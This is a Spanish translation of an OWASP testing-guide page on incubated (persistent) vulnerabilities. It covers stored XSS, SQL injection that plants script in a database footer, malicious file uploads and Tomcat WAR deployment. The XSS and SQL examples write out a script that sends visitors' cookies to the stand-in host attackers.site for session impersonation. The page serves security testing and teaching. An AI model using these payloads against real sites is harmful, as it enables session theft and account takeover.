# Prueba de vulnerabilidades incubadas

|ID          |
|------------|
|WSTG-INPV-14|

## Resumen

También conocida como ataques persistentes, la prueba incubada es un método de prueba complejo que requiere más de una vulnerabilidad de validación de datos para funcionar. Las vulnerabilidades incubadas se utilizan típicamente para llevar a cabo ataques de "agua potable" contra usuarios de aplicaciones web legítimas.

Las vulnerabilidades incubadas tienen las siguientes características:

- El vector de ataque necesita persistirse en primer lugar, debe almacenarse en la capa de persistencia, y esto solo ocurriría si hay una validación de datos débil o los datos llegan al sistema a través de otro canal, como una consola de administrador o directamente a través de un proceso por lotes en el backend.
- En segundo lugar, una vez que el vector de ataque se "recupera", el vector necesitaría ejecutarse con éxito. Por ejemplo, un ataque XSS incubado requeriría una validación de salida débil para que el script se entregue al cliente en su forma ejecutable.

La explotación de algunas vulnerabilidades, o incluso características funcionales de una aplicación web, permitirá a un atacante plantar un fragmento de datos que posteriormente será recuperado por un usuario desprevenido u otro componente del sistema, explotando alguna vulnerabilidad allí.

En una prueba de penetración, los `ataques incubados` se pueden utilizar para evaluar la criticidad de ciertos errores, utilizando el problema de seguridad particular encontrado para construir un ataque basado en el lado del cliente que generalmente se utilizará para apuntar a un gran número de víctimas al mismo tiempo (es decir, todos los usuarios que navegan por el sitio).

Este tipo de ataque asíncrono cubre un gran espectro de vectores de ataque, entre ellos los siguientes:

- Componentes de carga de archivos en una aplicación web, permitiendo al atacante cargar archivos multimedia corruptos (imágenes JPEG que explotan `CVE-2004-0200`, imágenes PNG que explotan `CVE-2004-0597`, archivos ejecutables, páginas del sitio con componentes activos, etc.)
- Problemas de scripting entre sitios (XSS) en publicaciones de foros públicos (consulte [Prueba de scripting entre sitios (XSS) almacenado](02-Testing_for_Stored_Cross_Site_Scripting.md) para detalles adicionales). Un atacante podría almacenar potencialmente scripts o código malicioso en un repositorio en el backend de la aplicación web (por ejemplo, una base de datos) para que este script/código sea ejecutado por uno de los usuarios (usuarios finales, administradores, etc.). El ataque incubado arquetípico se ejemplifica mediante el uso de una vulnerabilidad de scripting entre sitios (XSS) en un foro de usuarios, tablero de anuncios o blog para inyectar código JavaScript en la página vulnerable, que eventualmente se renderizará y ejecutará en el navegador del usuario del sitio, utilizando el nivel de confianza del sitio original (vulnerable) en el navegador del usuario.
- Inyección SQL/XPATH permitiendo al atacante cargar contenido a una base de datos, que posteriormente se recuperará como parte del contenido activo en una página web. Por ejemplo, si el atacante puede publicar JavaScript arbitrario en un tablero de anuncios para que sea ejecutado por los usuarios, entonces podría tomar el control de sus navegadores (por ejemplo, [XSS-proxy](https://sourceforge.net/projects/xss-proxy)).
- Servidores mal configurados permitiendo la instalación de paquetes Java o componentes similares del sitio (es decir, Tomcat, o consolas de alojamiento web como Plesk, CPanel, Helm, etc.)

## Objetivos de la prueba

- Identificar inyecciones que se almacenan y requieren un paso de recuperación para la inyección almacenada.
- Entender cómo podría ocurrir un paso de recuperación.
- Establecer oyentes o activar el paso de recuperación si es posible.

## Cómo probar

### Pruebas de caja negra

#### Ejemplo de carga de archivos

Verifique el tipo de contenido permitido para cargar en la aplicación web y la URL resultante para el archivo cargado. Cargue un archivo que explotará un componente en la estación de trabajo del usuario local cuando sea visto o descargado por el usuario. Envíe a su víctima un correo electrónico u otro tipo de alerta para llevarlo a navegar por la página. El resultado esperado es que el exploit se active cuando el usuario navegue por la página resultante o descargue y ejecute el archivo desde el sitio de confianza.

#### Ejemplo de XSS en un tablero de anuncios

1. Introduzca código JavaScript como el valor para el campo vulnerable, por instancia `<script>document.write('<img src="https://attackers.site/cv.jpg?'+document.cookie+'">')</script>`
2. Dirija a los usuarios a navegar por la página vulnerable o espere a que los usuarios la naveguen. Tenga un "oyente" en el host `attackers.site` escuchando todas las conexiones entrantes.
3. Cuando los usuarios naveguen por la página vulnerable, se enviará una solicitud que contenga su cookie (`document.cookie` se incluye como parte de la URL solicitada) al host `attackers.site`, como: `GET /cv.jpg?SignOn=COOKIEVALUE1;%20ASPSESSIONID=ROGUEIDVALUE; HTTP/1.1`
4. Use las cookies obtenidas para impersonar usuarios en el sitio vulnerable.

#### Ejemplo de inyección SQL

Generalmente, este conjunto de ejemplos aprovecha ataques XSS explotando una vulnerabilidad de inyección SQL. Lo primero que probar es si el sitio objetivo tiene una vulnerabilidad de inyección SQL. Esto se describe en [Prueba de inyección SQL](05-Testing_for_SQL_Injection.md). Para cada vulnerabilidad de inyección SQL, hay un conjunto subyacente de restricciones que describen el tipo de consultas que el atacante/pen-tester puede hacer.

El probador entonces tiene que hacer coincidir los ataques XSS que ha ideado con las entradas que se le permite insertar.

De manera similar al ejemplo anterior de XSS, use un campo de página web vulnerable a problemas de inyección SQL para cambiar un valor en la base de datos que sería utilizado por la aplicación como entrada para mostrarse en el sitio sin filtrado adecuado (esto sería una combinación de un problema de inyección SQL y XSS). Por instancia, supongamos que hay una tabla `footer` en la base de datos con todos los pies de página para las páginas del sitio, incluyendo un campo `notice` con el aviso legal que aparece en la parte inferior de cada página web. Podría usar la siguiente consulta para inyectar código JavaScript al campo `notice` en la tabla `footer` en la base de datos.

```sql
SELECT field1, field2, field3
FROM table_x
WHERE field2 = 'x';
   UPDATE footer
   SET notice = 'Copyright 1999-2030%20
       <script>document.write(\'<img src="https://attackers.site/cv.jpg?\'+document.cookie+\'">\')</script>'
   WHERE notice = 'Copyright 1999-2030';
```

Ahora, cada usuario que navegue por el sitio enviará silenciosamente sus cookies a `attackers.site`.

#### Servidor mal configurado

Algunos servidores web presentan una interfaz de administración que puede permitir a un atacante cargar componentes activos de su elección al sitio. Este podría ser el caso con un servidor Apache Tomcat que no aplica credenciales fuertes para acceder a su Administrador de Aplicaciones Web (o si los pen testers han podido obtener credenciales válidas para el módulo de administración por otros medios).

En este caso, se puede cargar un archivo WAR y desplegar una nueva aplicación web en el sitio, lo que no solo permitirá al pen tester ejecutar código de su elección localmente en el servidor, sino también plantar una aplicación en el sitio de confianza, a la que los usuarios regulares del sitio pueden acceder (muy probablemente con un mayor grado de confianza que cuando acceden a un sitio diferente).

Como también debería ser obvio, la capacidad de cambiar contenidos de páginas web en el servidor, a través de cualquier vulnerabilidad que pueda ser explotable en el host que dé al atacante permisos de escritura en webroot, también será útil para plantar tal ataque incubado en las páginas del servidor web (de hecho, este es un método conocido de propagación de infección para algunos gusanos de servidor web).

### Pruebas de caja gris

Las técnicas de prueba de caja gris o caja blanca serán las mismas que se discutieron anteriormente.

- Examinar la validación de entrada es clave para mitigar contra esta vulnerabilidad. Si otros sistemas en la empresa usan la misma capa de persistencia, pueden tener validación de entrada débil y los datos pueden persistirse a través de una `puerta trasera`.
- Para combatir el problema de la `puerta trasera` para ataques del lado del cliente, también se debe emplear validación de salida para que los datos contaminados se codifiquen antes de mostrarse al cliente, y por lo tanto no se ejecuten.

## Herramientas

- [XSS-proxy](https://sourceforge.net/projects/xss-proxy)
- [Zed Attack Proxy (ZAP)](https://www.zaproxy.org/)
- [Burp Suite](https://portswigger.net/burp)
- [Metasploit](https://www.metasploit.com/)

## Referencias

La mayoría de las referencias de la sección de scripting entre sitios son válidas. Como se explicó arriba, los ataques incubados se ejecutan al combinar exploits como ataques XSS o de inyección SQL.

### Avisos

- [CERT Advisory CA-2000-02 Malicious HTML Tags Embedded in Client Web Requests](https://resources.sei.cmu.edu/library/asset-view.cfm?assetID=496186)
- [Blackboard Academic Suite 6.2.23 +/-: Persistent cross-site scripting vulnerability](https://cxsecurity.com/issue/WLB-2006080004)